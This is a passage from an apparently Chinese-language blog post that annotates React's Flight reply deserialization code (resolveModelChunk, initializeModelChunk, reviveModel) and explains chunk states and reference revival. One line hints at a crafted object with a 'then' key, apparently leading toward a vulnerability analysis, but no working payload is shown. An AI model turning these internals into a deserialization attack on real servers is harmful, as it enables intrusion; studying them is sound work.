</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">chunk</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 核心：将字段值注入对应模型块，完成模型块的解析/初始化
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">resolveModelChunk</span><span class="p">(</span><span class="nx">chunk</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">id</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 id="模型块解析-resolvemodelchunk" class="heading-element"><span>模型块解析 resolveModelChunk</span>
  <a href="#%e6%a8%a1%e5%9e%8b%e5%9d%97%e8%a7%a3%e6%9e%90-resolvemodelchunk" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>该函数是 <strong>RSC Flight 协议体系下解析模型块（Model Chunk）的核心泛型函数</strong>，是 Flight 协议反序列化中模型块状态管理与数据解析的关键环节。核心功能可拆解为：</p>
<ol>
<li><strong>非挂起状态处理</strong>：若模型块已脱离 <code>PENDING</code> 状态，判定为流式数据块，根据特殊标记（<code>C</code> 开头）执行「关闭流控制器」或「入队模型数据」操作；</li>
<li><strong>挂起状态处理</strong>：若模型块处于 <code>PENDING</code> 状态，标记为「已解析模型」状态，存储解析值与 ID，触发模型块初始化；</li>
<li>监听器唤醒：初始化后检查模型块最终状态，唤醒关联的成功 / 失败监听器，完成异步回调的执行；</li>
</ol>
<p>整体实现了模型块「挂起→解析→回调」的完整生命周期管理，适配 Flight 协议的流式数据解析与异步模型还原逻辑。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// packages/react-server/src/ReactFlightReplyServer.js
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 解析模型块（Model Chunk）的核心泛型函数,核心作用：
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 1. 区分模型块状态执行差异化逻辑：
</span></span></span><span class="line"><span class="cl"><span class="cm"> *    - 非PENDING：按流式数据块处理，控制流的关闭/数据入队；
</span></span></span><span class="line"><span class="cl"><span class="cm"> *    - PENDING：标记为已解析状态，初始化模型并唤醒监听器；
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 2. 适配 Flight 协议的流式数据解析与异步模型还原，管理模型块完整生命周期；
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 3. 是 Flight 协议反序列化中模型块状态同步、回调执行的关键环节。
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @template T - 模型块存储的数据类型（泛型适配不同模型数据）
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @param {SomeChunk&lt;T&gt;} chunk - 待处理的模型块对象，包含状态、值、原因等核心属性
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @param {string} value - 解析后的模型字符串数据（Flight 序列化数据）
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @param {number} id - 模型块的唯一标识ID（关联 Flight 协议引用）
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @returns {void} - 无返回值，直接修改模型块的内部状态与关联控制器/监听器
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">resolveModelChunk</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">  <span class="nx">chunk</span><span class="o">:</span> <span class="nx">SomeChunk</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">value</span><span class="o">:</span> <span class="nx">string</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">id</span><span class="o">:</span> <span class="nx">number</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span><span class="o">:</span> <span class="k">void</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// ========== 分支1：模型块非PENDING状态（已解析/流式数据块） ==========
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="nx">chunk</span><span class="p">.</span><span class="nx">status</span> <span class="o">!==</span> <span class="nx">PENDING</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="err">…………</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// ========== 分支2：模型块处于PENDING状态（待解析） ==========
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// 提取模型块的成功/失败监听器队列（异步回调）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">const</span> <span class="nx">resolveListeners</span> <span class="o">=</span> <span class="nx">chunk</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">rejectListeners</span> <span class="o">=</span> <span class="nx">chunk</span><span class="p">.</span><span class="nx">reason</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// 类型断言：将PENDING状态的模型块转为已解析模型块
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">const</span> <span class="nx">resolvedChunk</span><span class="o">:</span> <span class="nx">ResolvedModelChunk</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;</span> <span class="o">=</span> <span class="p">(</span><span class="nx">chunk</span><span class="o">:</span> <span class="nx">any</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 标记模型块状态为「已解析模型」（RESOLVED_MODEL）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">resolvedChunk</span><span class="p">.</span><span class="nx">status</span> <span class="o">=</span> <span class="nx">RESOLVED_MODEL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 存储解析后的模型数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">resolvedChunk</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 存储模型块唯一ID
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">resolvedChunk</span><span class="p">.</span><span class="nx">reason</span> <span class="o">=</span> <span class="nx">id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// 若存在成功监听器，执行模型初始化并唤醒监听器
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="nx">resolveListeners</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 注释：若已绑定监听器时提前读取数据，可能存在监听器已失效/非最高优先级的问题（已知设计取舍）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 核心操作：初始化模型块（将序列化数据转为可运行的组件模型）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">initializeModelChunk</span><span class="p">(</span><span class="nx">resolvedChunk</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 初始化后模型块状态可能变更，检查并唤醒监听器，传递当前模型块、成功/失败监听器，完成异步回调执行
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">wakeChunkIfInitialized</span><span class="p">(</span><span class="nx">chunk</span><span class="p">,</span> <span class="nx">resolveListeners</span><span class="p">,</span> <span class="nx">rejectListeners</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>状态分支的核心设计</strong>：</p>
<ul>
<li>非 <code>PENDING</code> 状态判定为「流式数据块」，通过 <code>controller</code> 处理流的关闭 / 数据入队，适配 Flight 协议的流式渲染特性；</li>
<li><code>PENDING</code> 状态是模型块的初始状态，完成「标记解析状态→存储数据→初始化→唤醒监听器」的闭环，是同步模型数据的核心链路。</li>
</ul>
<p><strong>流式数据的特殊标记</strong>：</p>
<ul>
<li><code>value[0] === 'C'</code> 是 Flight 协议约定的「流关闭」标记，对应 <code>controller.close()</code>，用于终止流式数据的解析；</li>
<li>非 <code>C</code> 开头的数据通过 <code>enqueueModel</code> 入队，保证流式数据的增量解析。</li>
</ul>
<p><strong>泛型与类型断言的作用</strong>：</p>
<ul>
<li>泛型 <code>T</code> 适配不同类型的模型数据（如组件、表单、二进制数据），提升函数复用性；</li>
<li>类型断言（<code>chunk: any</code>）是 Flight 协议内部简化类型处理的设计，避免复杂的类型分支，代价是牺牲部分类型安全性。</li>
</ul>
<p><strong>监听器唤醒的时机</strong>：</p>
<ul>
<li><code>initializeModelChunk</code> 后调用 <code>wakeChunkIfInitialized</code>，因为初始化可能改变模型块状态（如 <code>fulfilled</code>/<code>rejected</code>），需根据最终状态唤醒对应监听器；</li>
<li>注释中提到的「监听器可能失效」是已知设计取舍，优先保证解析效率而非极致的监听器校验。</li>
</ul>
<h4 id="核心解码逻辑initializemodelchunk" class="heading-element"><span>核心解码逻辑：initializeModelChunk</span>
  <a href="#%e6%a0%b8%e5%bf%83%e8%a7%a3%e7%a0%81%e9%80%bb%e8%be%91initializemodelchunk" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>该函数是 <strong>RSC Flight 协议体系下初始化模型块（Model Chunk）的核心泛型函数</strong>，是 Flight 协议反序列化中「原始序列化数据 → 可运行组件模型」的关键转换环节。核心功能可拆解为：</p>
<ol>
<li><strong>全局状态保护</strong>：暂存并恢复全局的「初始化中模型块」状态，避免并发初始化导致的冲突；</li>
<li><strong>初始状态标记</strong>：将模型块先标记为 <code>CYCLIC</code>（循环引用）状态，防止解析过程中重复初始化；</li>
<li><strong>数据解析与还原</strong>：解析序列化的 JSON 字符串，通过 <code>reviveModel</code> 递归还原为带类型的组件模型；</li>
<li><strong>状态分支处理</strong>：
<ul>
<li>存在未解析依赖：标记为 <code>BLOCKED</code>（阻塞）状态，等待依赖解析完成；</li>
<li>无未解析依赖：标记为 <code>INITIALIZED</code>（已初始化）状态，唤醒成功监听器；</li>
</ul>
</li>
<li><strong>异常处理</strong>：捕获解析 / 还原过程中的异常，标记为 <code>ERRORED</code>（错误）状态；</li>
</ol>
<p>整体实现了模型块从「已解析标记」到「循环→阻塞 / 初始化 / 错误」的状态流转，是 Flight 协议处理复杂组件模型（含循环引用、依赖阻塞）的核心逻辑。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// packages/react-server/src/ReactFlightReplyServer.js  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 初始化模型块（Model Chunk）的核心泛型函数，核心作用：
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 1. 安全初始化模型块（暂存/恢复全局状态，避免并发冲突）；
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 2. 先标记为CYCLIC状态防止循环引用导致的重复初始化；
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 3. 解析JSON序列化数据，通过reviveModel还原为带类型的组件模型；
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 4. 根据依赖状态标记为BLOCKED（阻塞）/INITIALIZED（已初始化），异常时标记为ERRORED；
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 5. 是 Flight 协议反序列化中「原始数据 → 组件模型」的核心转换环节。
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @template T - 模型块存储的数据类型（泛型适配组件/表单/流式数据等不同场景）
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @param {ResolvedModelChunk&lt;T&gt;} chunk - 已解析标记的模型块（含序列化JSON数据、响应上下文等）
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @returns {void} - 无返回值，直接修改模型块的状态、值、原因等核心属性
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">initializeModelChunk</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;</span><span class="p">(</span><span class="nx">chunk</span><span class="o">:</span> <span class="nx">ResolvedModelChunk</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;</span><span class="p">)</span><span class="o">:</span> <span class="k">void</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// ========== 步骤1：暂存全局初始化状态，避免并发冲突 ==========
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">const</span> <span class="nx">prevChunk</span> <span class="o">=</span> <span class="nx">initializingChunk</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">prevBlocked</span> <span class="o">=</span> <span class="nx">initializingChunkBlockedModel</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nx">initializingChunk</span> <span class="o">=</span> <span class="nx">chunk</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nx">initializingChunkBlockedModel</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// ========== 步骤2：处理根引用标识，提取序列化模型数据 ==========
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">const</span> <span class="nx">rootReference</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">    <span class="nx">chunk</span><span class="p">.</span><span class="nx">reason</span> <span class="o">===</span> <span class="o">-</span><span class="mi">1</span> <span class="o">?</span> <span class="kc">undefined</span> <span class="o">:</span> <span class="nx">chunk</span><span class="p">.</span><span class="nx">reason</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 提取模型块中存储的原始JSON序列化数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">const</span> <span class="nx">resolvedModel</span> <span class="o">=</span> <span class="nx">chunk</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// ========== 步骤3：初始状态标记为CYCLIC，防止循环引用重复初始化 ==========
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">const</span> <span class="nx">cyclicChunk</span><span class="o">:</span> <span class="nx">CyclicChunk</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;</span> <span class="o">=</span> <span class="p">(</span><span class="nx">chunk</span><span class="o">:</span> <span class="nx">any</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nx">cyclicChunk</span><span class="p">.</span><span class="nx">status</span> <span class="o">=</span> <span class="nx">CYCLIC</span><span class="p">;</span>    
</span></span><span class="line"><span class="cl">  <span class="nx">cyclicChunk</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>       
</span></span><span class="line"><span class="cl">  <span class="nx">cyclicChunk</span><span class="p">.</span><span class="nx">reason</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>      
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// ========== 步骤4：解析JSON并还原为带类型的组件模型 ==========
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 1. JSON 解析，将序列化的JSON字符串解析为原始JS对象
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kr">const</span> <span class="nx">rawModel</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">resolvedModel</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 2. Flight反序列化核心：通过reviveModel递归还原模型，将JSON转换为RSC组件模型
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kr">const</span> <span class="nx">value</span><span class="o">:</span> <span class="nx">T</span> <span class="o">=</span> <span class="nx">reviveModel</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="nx">chunk</span><span class="p">.</span><span class="nx">_response</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span><span class="s1">&#39;&#39;</span><span class="o">:</span> <span class="nx">rawModel</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">rawModel</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">rootReference</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// ========== 步骤5：根据依赖状态标记模型块最终状态 ==========
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="nx">initializingChunkBlockedModel</span> <span class="o">!==</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">      <span class="nx">initializingChunkBlockedModel</span><span class="p">.</span><span class="nx">deps</span> <span class="o">&gt;</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 分支1：存在未解析的模块依赖 → 标记为BLOCKED（阻塞）状态
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 分支2：无未解析依赖 → 标记为INITIALIZED（已初始化）状态
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// ========== 步骤6：捕获解析/还原异常，标记为ERRORED（错误）状态 ==========
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span> <span class="k">finally</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// ========== 步骤7：恢复全局初始化状态，保证并发安全 ==========
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">initializingChunk</span> <span class="o">=</span> <span class="nx">prevChunk</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">initializingChunkBlockedModel</span> <span class="o">=</span> <span class="nx">prevBlocked</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>关键步骤：</strong></p>
<ul>
<li>1、 对 <code>chunk.value</code> 进行 JSON 解析，得到如 <code>{then: &quot;$1:...&quot;, ...}</code> 的对象</li>
<li>2、<code>reviveModel</code> 处理 JSON，将字符串引用还原为实际对象</li>
</ul>
<p><strong>Flight 协议反序列化核心（<code>reviveModel</code>）</strong>：</p>
<ul>
<li><code>reviveModel</code> 是 Flight 协议的核心反序列化函数，作用是将「原始 JSON 对象」转换为「RSC 可识别的组件模型」；</li>
<li>其参数包含 RSC 响应对象、解析路径、根引用标识，可处理组件引用、模块依赖、循环引用等复杂场景，是「数据 → 组件」的关键转换。</li>
</ul>
<h4 id="还原对象revivemodel" class="heading-element"><span>还原对象：reviveModel</span>
  <a href="#%e8%bf%98%e5%8e%9f%e5%af%b9%e8%b1%a1revivemodel" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>该函数是  RSC Flight 协议体系下模型数据反序列化的核心递归函数，是 Flight 协议将序列化的 JSON 数据（字符串 / 对象 / 数组）转换为可运行 RSC 组件模型的核心环节。核心功能可拆解为：</p>
<ol>
<li><strong>类型分支处理</strong>：根据值的类型（字符串 / 对象 / 数组 / 基础类型）执行差异化还原逻辑；</li>
<li><strong>字符串解析</strong>：调用 <code>parseModelString</code> 解析 Flight 协议约定的特殊标记字符串（如组件引用、模块路径、特殊值等），还原为对应 JS 实体；</li>
<li><strong>对象 / 数组递归还原</strong>：遍历对象 / 数组的每一个属性 / 元素，递归完成深层数据还原，同时维护「临时引用标识」；</li>
<li><strong>临时引用注册</strong>：为对象绑定 Flight 协议的引用标识，解决循环引用、跨模型引用问题；</li>
<li><strong>无效属性清理</strong>：还原结果为 <code>undefined</code> 的属性会被删除，保证模型数据的合法性；</li>
</ol>
<p>整体是 Flight 协议反序列化中「扁平化 JSON 数据 → 结构化组件模型」的核心递归逻辑，支撑 RSC 组件模型的完整还原。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Flight 协议：模型数据反序列化核心递归函数，核心作用：
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 1. 递归遍历序列化的JSON数据，按Flight协议规则还原为可运行的RSC组件模型；
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 2. 解析特殊标记字符串（$开头）为对应JS实体（组件引用、Date、TypedArray等）；
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 3. 注册临时引用标识，解决循环引用/跨模型引用问题；
